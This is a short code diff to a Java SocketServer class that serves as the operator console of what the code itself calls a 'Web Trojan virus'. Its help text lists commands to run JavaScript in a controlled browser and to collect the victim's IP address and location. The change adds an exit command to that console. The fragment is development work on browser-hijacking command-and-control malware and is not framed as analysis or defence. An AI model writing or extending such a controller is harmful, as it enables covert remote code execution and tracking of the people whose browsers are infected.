@@ -29,7 +29,8 @@ public class SocketServer {
                                 " 1. jsconsole                      Run javascript on control browser.\n" +
                                 " 2. getip                          Get Controlled-end's IP address.\n" +
                                 " 3. getlocation                    Get Controlled-end's location information.\n" +
-                                " 4. close                          Close the Controlled-end's javascript Trojan virus.");
+                                " 4. close                          Close the Controlled-end's javascript Trojan virus.\n" +
+                                " 5. exit                           Exit from Web Trojan virus console.\n");
                         continue;
                     }
                     if (command.equals("jsconsole")) {
@@ -48,6 +49,9 @@ public class SocketServer {
                             SocketServer.sendCommand = "js: "+javascript;
                         }
                         continue;
+                    }
+                    if (command.equals("exit")) {
+                        System.exit(0);
                     }
                     else {
                         SocketServer.sendCommand = command;
